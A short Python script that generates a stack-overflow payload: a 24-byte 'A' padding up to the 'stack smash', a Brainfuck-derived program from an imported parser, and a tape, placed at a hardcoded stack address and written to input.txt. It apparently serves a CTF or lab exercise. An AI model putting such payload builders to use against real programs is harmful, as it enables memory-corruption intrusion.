from bf_parser.bf_parser import *

p = BF_Parser("+")

offset = b"A" * 24 # offset until stack smash ; added for debugging
tape = b"\x00" * 1024 # the brainfuck tape

payload_len = p.get_payload_len()
sp_addr = 0x3ffffff020
pointer_start = sp_addr + len(offset) + payload_len + 512 # the middle of the tape
backup_addr = sp_addr # address for read_mem and write_mem operations

payload = offset + p.parse(pointer_start, backup_addr) + tape

num_bytes = len(payload)

print(f"The payload has {num_bytes} bytes and can be found in the input.txt file")
# print(payload_len)
# print(pointer_start)
# print(payload)

print("----------------debug info------------------")
print(f"calculated len: {payload_len} ... actual len: {len(p.parse(pointer_start, backup_addr))}")
print(f"pointer start: {hex(pointer_start)} \nbackup address: {hex(backup_addr)}")

with open("input.txt", "wb") as fout:
    fout.write(payload)